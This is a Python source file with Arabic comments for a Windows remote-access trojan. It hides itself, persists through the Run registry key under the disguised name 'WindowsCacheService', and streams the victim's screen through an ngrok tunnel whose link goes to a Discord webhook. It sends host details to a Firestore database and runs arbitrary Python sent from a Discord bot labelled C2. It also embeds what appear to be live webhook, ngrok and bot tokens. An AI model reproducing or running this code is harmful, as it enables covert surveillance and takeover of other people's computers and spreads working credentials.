# -*- coding: utf-8 -*-
import os
import sys
import io
import time
import ctypes
import struct
import json
import socket
import secrets
import zipfile
import threading
import urllib.request
import subprocess
import winreg
import platform
import uuid
import shutil
import traceback
import asyncio
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

DEBUG = ("--debug" in sys.argv) or (os.environ.get("WCDEBUG") == "1")
CREATE_NO_WINDOW = 0x08000000
HIDDEN_ATTR = 0x2 | 0x4

# ====== الإعدادات ======
WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
NGROK_TOKEN = "2kk7ztO8NUN7U9205uKKy8vpwM2_3B4yKGo3hAZEanPHSxBu1"
NGROK_DOWNLOAD_URLS = [
    "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
    "https://bin.equinox.io/a/cJk8dzafvmN/ngrok-v3-3.3.1-windows-amd64.zip",
]
FIREBASE_BASE = "https://firestore.googleapis.com/v1/projects/database-c7f56/databases/(default)"
FIREBASE_STATUS_URL = FIREBASE_BASE + "/documents/users/app"
MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP_REG_NAME = "WindowsCacheService"
CHECK_INTERVAL = 120
TARGET_NAME = "SK5X08-PC"

# ====== إعدادات بوت الديسكورد (C2) ======
BOT_TOKEN = "MTUzNDYyMTc1OTMyNjkxNjYwOQ.G2Jp_p.QL2LOyEPJxlFMHImHbykNImLrquzc1AK1FncfY"
OWNER_ID = 1170725180780331012
DEVICE_ID = ""

# ====== إعدادات البث ======
STREAM_FPS = 12
JPEG_QUALITY = 70
MAX_WIDTH = 1280

# ====== المسارات ======
APPDATA = os.environ.get("APPDATA") or os.path.expanduser("~")
BASE_DIR = os.path.join(APPDATA, "Microsoft", "WindowsCache")
NGROK_EXE = os.path.join(BASE_DIR, "ngrok.exe")
DATA_FILE = os.path.join(BASE_DIR, "data.json")
RUNNING_PATH = os.path.abspath(sys.argv[0])

def log(msg):
    if DEBUG:
        try:
            print(msg)
            sys.stdout.flush()
        except Exception:
            pass

if DEBUG:
    try:
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
        ctypes.windll.kernel32.SetConsoleCP(65001)
    except Exception:
        pass
    log("=" * 55)
    log("[*] أداة البث المباشر - وضع التجربة (صفحة دخول + بث سلس)")
    log("=" * 55)

if not DEBUG:
    try:
        console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if console_hwnd:
            ctypes.windll.user32.ShowWindow(console_hwnd, 0)
    except Exception:
        pass

try:
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:
        log("[!] المثيل يعمل مسبقاً - أغلق العملية القديمة أولاً")
        sys.exit(0)
except Exception:
    pass

# ====== أدوات مساعدة ======
def hide_path(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, HIDDEN_ATTR)
    except Exception:
        try:
            subprocess.run(["attrib", "+h", "+s", path],
                           creationflags=CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

def find_pythonw():
    try:
        result = subprocess.run(["where", "pythonw"], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, timeout=5, text=True)
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                p = line.strip()
                if os.path.isfile(p):
                    return p
    except Exception:
        pass
    return sys.executable

def load_data():
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_data(data):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception:
        pass

def send_discord_message(text):
    try:
        payload = json.dumps({"content": text}).encode("utf-8")
        req = urllib.request.Request(WEBHOOK_URL, data=payload, method="POST",
                                     headers={"Content-Type": "application/json",
                                              "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status == 200
    except Exception:
        return False

# ====== Firebase / سجل الأجهزة والأوامر ======
def firestore_write(collection, doc_id, fields):
    try:
        url = f"{FIREBASE_BASE}/documents/{collection}/{doc_id}?" + \
              "&".join("updateMask.fieldPaths=" + k for k in fields.keys())
        body = {"fields": {k: {"stringValue": str(v)} for k, v in fields.items()}}
        req = urllib.request.Request(url, data=json.dumps(body).encode("utf-8"), method="PATCH",
                                     headers={"Content-Type": "application/json",
                                              "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status in (200, 201)
    except Exception as e:
        log(f"[!] فشل الكتابة في Firebase ({collection}/{doc_id}): {e}")
        return False

def firestore_get_doc(collection, doc_id):
    try:
        req = urllib.request.Request(f"{FIREBASE_BASE}/documents/{collection}/{doc_id}",
                                     headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read().decode("utf-8"))
    except Exception:
        return None

def firestore_list_docs(collection):
    try:
        req = urllib.request.Request(f"{FIREBASE_BASE}/documents/{collection}",
                                     headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read().decode("utf-8")).get("documents", [])
    except Exception:
        return []

def fetch_firebase_field(field_name, default="on"):
    try:
        req = urllib.request.Request(FIREBASE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=6) as response:
            data = json.loads(response.read().decode())
            field = data.get("fields", {}).get(field_name, {})
            if "stringValue" in field:
                return field["stringValue"].strip().lower()
            if "booleanValue" in field:
                return "on" if field["booleanValue"] else "off"
            return default
    except Exception:
        return default

def is_this_owner():
    username = os.environ.get("USERNAME", "").strip().upper()
    if username == "HAMDI":
        return True
    me_txt = r"C:\Users\HAMDI\Documents\mybots\apps\me.txt"
    if os.path.exists(me_txt):
        return True
    if socket.gethostname().upper() == TARGET_NAME.upper():
        return True
    return False

def should_send_screenshot():
    if is_this_owner():
        return True
    o = fetch_firebase_field("owner", "off")
    a = fetch_firebase_field("all", "off")
    return o == "on" or a == "on"

def ensure_pil():
    try:
        from PIL import Image, ImageDraw
        log("[+] Pillow متوفرة")
    except ImportError:
        log("[*] فحص Pillow...")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "--disable-pip-version-check", "Pillow"],
                           timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log("[+] تم تثبيت Pillow")
        except Exception as e:
            log(f"[!] فشل تثبيت Pillow: {e}")

def get_device_id():
    try:
        data = load_data()
        if "device_id" in data:
            return data["device_id"]
        did = platform.node() + "_" + str(uuid.getnode())[:8]
        data["device_id"] = did
        save_data(data)
        return did
    except Exception:
        return "UNKNOWN"

def ensure_persistence():
    try:
        if not os.path.exists(BASE_DIR):
            os.makedirs(BASE_DIR, exist_ok=True)
        hide_path(BASE_DIR)
        if is_this_owner():
            return
        copy_to = os.path.join(APPDATA, "Microsoft", "WindowsCache", "run.exe")
        if not os.path.exists(copy_to):
            shutil.copy(RUNNING_PATH, copy_to)
        try:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH) as key:
                winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ, copy_to)
        except Exception:
            pass
    except Exception as e:
        log(f"[!] فشل الثبات: {e}")

captured_frames = []
frame_lock = threading.Lock()

def capture_worker():
    global captured_frames
    try:
        from PIL import ImageGrab
    except ImportError:
        log("[!] Pillow غير متاح - لا يمكن التقاط الشاشة")
        return
    
    while True:
        try:
            img = ImageGrab.grab()
            img.thumbnail((MAX_WIDTH, int(MAX_WIDTH * 9 / 16)))
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=JPEG_QUALITY)
            with frame_lock:
                captured_frames = [buf.getvalue()]
            time.sleep(1.0 / STREAM_FPS)
        except Exception as e:
            log(f"[!] خطأ في التقاط الشاشة: {e}")
            time.sleep(1)

def start_stream_server():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 0))
            port = s.getsockname()[1]
    except Exception:
        port = 55065
    
    class StreamHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urlparse(self.path)
            if parsed.path == "/":
                params = parse_qs(parsed.query)
                key = params.get("key", [""])[0]
                data = load_data()
                password = data.get("password", "")
                if key != password:
                    self.send_response(403)
                    self.send_header("Content-type", "text/html; charset=utf-8")
                    self.end_headers()
                    self.wfile.write("<h1>محاولة الدخول</h1>".encode('utf-8'))
                    return
                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.end_headers()
                html = """
<html dir="rtl">
<head>
<meta charset="utf-8">
<title>بث مباشر</title>
<style>
body { background: #1e1e1e; color: #fff; font-family: Arial; text-align: center; margin: 0; padding: 20px; }
img { max-width: 90%; max-height: 90vh; border: 1px solid #666; }
</style>
</head>
<body>
<h1>البث المباشر</h1>
<img id="stream" src="javascript:void(0)" />
<script>
function update() { document.getElementById('stream').src = '/frame?_=' + Date.now(); }
setInterval(update, 100);
update();
</script>
</body>
</html>
"""
                self.wfile.write(html.encode('utf-8'))
            elif parsed.path == "/frame":
                with frame_lock:
                    if captured_frames:
                        self.send_response(200)
                        self.send_header("Content-type", "image/jpeg")
                        self.end_headers()
                        self.wfile.write(captured_frames[0])
                    else:
                        self.send_response(503)
                        self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        
        def log_message(self, format, *args):
            pass
    
    server = ThreadingHTTPServer(("127.0.0.1", port), StreamHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log(f"[+] خادم البث يعمل على http://127.0.0.1:{port}")
    return port

def kill_existing_ngrok():
    try:
        subprocess.run(["taskkill", "/F", "/IM", "ngrok.exe"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def download_ngrok():
    for url in NGROK_DOWNLOAD_URLS:
        try:
            log(f"[*] تحميل ngrok من {url}...")
            zip_path = os.path.join(BASE_DIR, "ngrok.zip")
            urllib.request.urlretrieve(url, zip_path)
            with zipfile.ZipFile(zip_path, "r") as z:
                z.extractall(BASE_DIR)
            os.remove(zip_path)
            if os.path.exists(NGROK_EXE):
                log("[+] تم تحميل ngrok")
                return True
        except Exception:
            pass
    return False

def ensure_ngrok(port):
    if not os.path.exists(NGROK_EXE):
        if not download_ngrok():
            return None
    try:
        subprocess.Popen([NGROK_EXE, "http", str(port), "--authtoken", NGROK_TOKEN],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         creationflags=CREATE_NO_WINDOW)
        time.sleep(2)
        req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read().decode())
            for t in data.get("tunnels", []):
                if t.get("proto") == "https":
                    return t.get("public_url", "").replace("https://", "https://")
    except Exception:
        pass
    return None

def get_total_ram_gb():
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        mem_status = ctypes.c_ulong()
        GetPhysicallyInstalledSystemMemory = kernel32.GetPhysicallyInstalledSystemMemory
        GetPhysicallyInstalledSystemMemory(ctypes.byref(mem_status))
        return str(mem_status.value // 1048576)
    except Exception:
        try:
            result = subprocess.run(["systeminfo"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split("\n"):
                if "Total Physical Memory" in line:
                    parts = line.split(":")
                    if len(parts) > 1:
                        memory_str = parts[1].strip().replace("MB", "").strip()
                        return str(int(memory_str) // 1024)
        except Exception:
            pass
        return "?"

def heartbeat_loop():
    global DEVICE_ID
    while True:
        try:
            if DEVICE_ID:
                firestore_write("devices", DEVICE_ID, {
                    "last_seen": str(int(time.time())),
                    "user": os.environ.get("USERNAME", "?"),
                    "name": platform.node(),
                    "win_name": platform.system(),
                    "release": platform.release(),
                    "arch": platform.architecture()[0],
                    "cpu": platform.processor(),
                    "ram_gb": get_total_ram_gb(),
                    "screen": f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}",
                    "ip": socket.gethostbyname(socket.gethostname()),
                    "mac": str(uuid.getnode()),
                    "python": f"{sys.version_info.major}.{sys.version_info.minor}",
                    "admin": "yes" if ctypes.windll.shell32.IsUserAnAdmin() else "no"
                })
        except Exception:
            pass
        time.sleep(30)

def poll_commands_loop():
    global DEVICE_ID
    last_cmd = load_data().get("last_cmd", "")
    while True:
        try:
            if DEVICE_ID:
                docs = firestore_list_docs("commands")
                for d in docs:
                    cmd_id = d["name"].rsplit("/", 1)[-1]
                    if cmd_id == last_cmd:
                        continue
                    f = d.get("fields", {})
                    ctype = f.get("type", {}).get("stringValue", "")
                    if ctype == "ann":
                        text = f.get("text", {}).get("stringValue", "")
                        try:
                            ctypes.windll.user32.MessageBoxW(None, text, "رسالة", 0x00000040)
                        except Exception:
                            pass
                    elif ctype == "exec":
                        code = f.get("code", {}).get("stringValue", "")
                        try:
                            def run_code(cid, c):
                                try:
                                    out = io.StringIO()
                                    exec(c, {"__builtins__": __builtins__})
                                except Exception as e:
                                    out = str(e)
                                firestore_write("results", cid, {
                                    "status": "done",
                                    "output": str(out)[:500]
                                })
                            threading.Thread(target=run_code, args=(cmd_id, code), daemon=True).start()
                        except Exception:
                            pass
                    last_cmd = cmd_id
                    d = load_data()
                    d["last_cmd"] = cmd_id
                    save_data(d)
                    log(f"[+] أمر جديد من البوت: {ctype}")
        except Exception as e:
            log(f"[!] خطأ في جلب الأوامر: {e}")
        time.sleep(4)

def fmt_uptime(secs):
    try:
        secs = int(secs or 0)
        d, rem = divmod(secs, 86400)
        h, rem = divmod(rem, 3600)
        m = rem // 60
        return f"{d}يوم {h}س {m}د"
    except Exception:
        return "?"

def start_bot():
    if not BOT_TOKEN or BOT_TOKEN == "ضع_توكن_البوت_هنا":
        log("[!] ضع توكن البوت في المتغير BOT_TOKEN")
        return
    try:
        import discord
    except Exception:
        log("[*] جاري تثبيت discord.py...")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                            "--disable-pip-version-check", "discord.py"],
                           timeout=300, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            import discord
        except Exception as e:
            log(f"[!] فشل تثبيت discord.py: {e}")
            return

    class C2Bot(discord.Client):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.tree = discord.app_commands.CommandTree(self)
            self._setup_commands()

        def _setup_commands(self):
            @self.tree.command(name="list", description="عرض قائمة الأجهزة المتصلة")
            async def list_cmd(interaction: discord.Interaction):
                if not await self._check_owner(interaction):
                    return
                await interaction.response.defer()
                try:
                    docs = firestore_list_docs("devices")
                    if not docs:
                        await interaction.followup.send("❌ لا توجد أجهزة مسجلة حالياً")
                        return
                    now = int(time.time())
                    lines = []
                    for d in docs:
                        f = d.get("fields", {})
                        name = f.get("name", {}).get("stringValue", "؟")
                        did = d["name"].rsplit("/", 1)[-1]
                        ls_str = f.get("last_seen", {}).get("stringValue", "0")
                        ls = self._safe_int(ls_str, 0)
                        online = "🟢" if (now - ls) < 180 else "🔴"
                        lines.append(f"{online} **{name}** | `{did}`")
                    text = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n**📱 قائمة الأجهزة**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines)
                    if len(text) > 1900:
                        for i in range(0, len(text), 1900):
                            await interaction.followup.send(text[i:i + 1900])
                    else:
                        await interaction.followup.send(text)
                except Exception as e:
                    await interaction.followup.send(f"❌ خطأ: {str(e)[:80]}")

            @self.tree.command(name="info", description="معلومات جهاز معين")
            @discord.app_commands.describe(device_id="معرف الجهاز")
            async def info_cmd(interaction: discord.Interaction, device_id: str):
                if not await self._check_owner(interaction):
                    return
                await interaction.response.defer()
                try:
                    did = device_id.strip()
                    if not did:
                        await interaction.followup.send("❌ معرف الجهاز فارغ")
                        return
                    doc = firestore_get_doc("devices", did)
                    if not doc:
                        await interaction.followup.send(f"❌ الجهاز `{did}` غير موجود")
                        return
                    f = doc.get("fields", {})
                    def gv(k):
                        v = f.get(k, {}).get("stringValue", "؟")
                        return v if v else "؟"
                    ls_str = gv("last_seen")
                    ls = self._safe_int(ls_str, 0)
                    now = int(time.time())
                    online = "🟢 متصل" if (now - ls) < 180 else "🔴 غير متصل"
                    ls_txt = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ls)) if ls else "؟"
                    msg = (
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"**📊 معلومات الجهاز**\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"**المعرف:** `{did}`\n"
                        f"**الاسم:** {gv('name')}\n"
                        f"**المستخدم:** {gv('user')}\n"
                        f"**النظام:** {gv('win_name')} ({gv('release')} {gv('arch')})\n"
                        f"**المعالج:** {gv('cpu')}\n"
                        f"**الذاكرة:** {gv('ram_gb')} GB\n"
                        f"**الشاشة:** {gv('screen')}\n"
                        f"**الآيبي:** {gv('ip')}\n"
                        f"**MAC:** {gv('mac')}\n"
                        f"**بايثون:** {gv('python')}\n"
                        f"**صلاحيات:** {gv('admin')}\n"
                        f"**الحالة:** {online}\n"
                        f"**آخر ظهور:** {ls_txt}"
                    )
                    su = gv("stream_url")
                    if su != "؟":
                        msg += f"\n**رابط البث:** {su}"
                    await interaction.followup.send(msg)
                except Exception as e:
                    await interaction.followup.send(f"❌ خطأ: {str(e)[:80]}")

            @self.tree.command(name="ann", description="إرسال رسالة إلى جهاز")
            @discord.app_commands.describe(device_id="معرف الجهاز", message="نص الرسالة")
            async def ann_cmd(interaction: discord.Interaction, device_id: str, message: str):
                if not await self._check_owner(interaction):
                    return
                await interaction.response.defer()
                try:
                    did = device_id.strip()
                    text = message.strip()
                    if not did or not text:
                        await interaction.followup.send("❌ المعرف أو الرسالة فارغة")
                        return
                    ok = firestore_write("commands", did, {
                        "cmd_id": secrets.token_hex(8),
                        "type": "ann",
                        "text": text,
                        "ts": str(int(time.time()))
                    })
                    if ok:
                        await interaction.followup.send(f"✅ تم إرسال الرسالة إلى `{did}`")
                    else:
                        await interaction.followup.send(f"❌ فشل إرسال الرسالة")
                except Exception as e:
                    await interaction.followup.send(f"❌ خطأ: {str(e)[:80]}")

            @self.tree.command(name="insert", description="تنفيذ كود Python على جهاز")
            @discord.app_commands.describe(device_id="معرف الجهاز", code="كود Python")
            async def insert_cmd(interaction: discord.Interaction, device_id: str, code: str):
                if not await self._check_owner(interaction):
                    return
                await interaction.response.defer()
                try:
                    did = device_id.strip()
                    code_text = code.strip()
                    if not did or not code_text:
                        await interaction.followup.send("❌ المعرف أو الكود فارغ")
                        return
                    ok = firestore_write("commands", did, {
                        "cmd_id": secrets.token_hex(8),
                        "type": "exec",
                        "code": code_text,
                        "ts": str(int(time.time()))
                    })
                    if ok:
                        await interaction.followup.send(f"✅ تم إرسال الكود إلى `{did}`")
                    else:
                        await interaction.followup.send(f"❌ فشل إرسال الكود")
                except Exception as e:
                    await interaction.followup.send(f"❌ خطأ: {str(e)[:80]}")

            @self.tree.command(name="help", description="عرض أوامر البوت")
            async def help_cmd(interaction: discord.Interaction):
                help_text = (
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "**📋 أوامر البوت المتاحة**\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "**`/list`** - عرض قائمة الأجهزة\n"
                    "**`/info <معرف>`** - معلومات جهاز\n"
                    "**`/ann <معرف> <رسالة>`** - رسالة لجهاز\n"
                    "**`/insert <معرف> <كود>`** - تنفيذ كود\n"
                    "**`/help`** - هذه المساعدة\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                )
                await interaction.response.send_message(help_text)

        def _safe_int(self, value, default=0):
            try:
                if value and value != "?":
                    return int(value)
            except (ValueError, TypeError):
                pass
            return default

        async def on_ready(self):
            log(f"[+] بوت الديسكورد متصل: {self.user}")
            await self.tree.sync()
            log(f"[+] تم مزامنة {len(self.tree.get_commands())} أوامر")
            self.loop.create_task(self.results_loop())

        async def results_loop(self):
            while not self.is_closed():
                try:
                    docs = firestore_list_docs("results")
                    for d in docs:
                        f = d.get("fields", {})
                        if f.get("delivered", {}).get("stringValue", "no") == "yes":
                            continue
                        did = d["name"].rsplit("/", 1)[-1]
                        status = f.get("status", {}).get("stringValue", "?")
                        output = f.get("output", {}).get("stringValue", "")
                        try:
                            user = await self.fetch_user(OWNER_ID)
                            await user.send(f"**نتيجة تنفيذ على `{did}`** ({status}):\n```\n{output}\n```")
                            firestore_write("results", did, {"delivered": "yes"})
                        except Exception:
                            pass
                except Exception:
                    pass
                await asyncio.sleep(3)

        async def _check_owner(self, interaction: discord.Interaction) -> bool:
            if interaction.user.id != OWNER_ID:
                await interaction.response.send_message("❌ ليس لديك صلاحية", ephemeral=True)
                return False
            return True

    try:
        intents = discord.Intents.default()
        intents.message_content = True
        bot = C2Bot(intents=intents)
        threading.Thread(target=lambda: bot.run(BOT_TOKEN, log_handler=None),
                         daemon=True).start()
        log("[+] خيط البوت يعمل (slash commands فعّال)")
    except Exception as e:
        log(f"[!] فشل تشغيل البوت: {e}")

# ====== الحلقة الرئيسية ======
def main_loop(port):
    data = load_data()
    password = data.get("password", "")
    if not password:
        password = secrets.token_urlsafe(8)
        data["password"] = password
        save_data(data)
    last_sent = data.get("last_url", "")
    log(f"[*] كلمة المرور: {password}")
    log("[*] في انتظار تشغيل النفق وإرسال رسالة الديسكورد...")

    while True:
        try:
            if should_send_screenshot():
                url = ensure_ngrok(port)
                if url and url != last_sent:
                    msg = (
                        f"تم كل شيء\n"
                        f"الرابط: {url}/?key={password}\n"
                        f"كلمة المرور: {password}\n"
                        f"ملاحظة: إذا ظهرت صفحة تحذير ngrok اضغط (Visit Site) مرة وحدة"
                    )
                    if send_discord_message(msg):
                        log("[+] تم إرسال الرابط وكلمة المرور للديسكورد")
                        last_sent = url
                        data["last_url"] = url
                        save_data(data)
                    else:
                        log("[!] فشل إرسال رسالة الديسكورد")
                    try:
                        firestore_write("devices", DEVICE_ID, {"stream_url": f"{url}/?key={password}"})
                    except Exception:
                        pass
            else:
                log("[*] الإرسال معطل من Firebase (owner/all = off)")
        except Exception as e:
            log(f"[!] خطأ في الحلقة: {e}")
        time.sleep(CHECK_INTERVAL)

# ====== البداية ======
def main():
    global PASSWORD, DEVICE_ID
    os.makedirs(BASE_DIR, exist_ok=True)
    hide_path(BASE_DIR)
    ensure_persistence()
    ensure_pil()
    data = load_data()
    PASSWORD = data.get("password", "")
    if not PASSWORD:
        PASSWORD = secrets.token_urlsafe(8)
        data["password"] = PASSWORD
        save_data(data)
    DEVICE_ID = get_device_id()
    log(f"[+] معرف الجهاز: {DEVICE_ID}")
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=poll_commands_loop, daemon=True).start()
    start_bot()
    kill_existing_ngrok()
    port = start_stream_server()
    capture_thread = threading.Thread(target=capture_worker, daemon=True)
    capture_thread.start()
    log(f"[+] خيط التقاط الشاشة يعمل ({STREAM_FPS} إطار/ثانية)")
    main_loop(port)

if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as e:
        log(f"[!] خطأ غير متوقع: {e}")
        sys.exit(1)
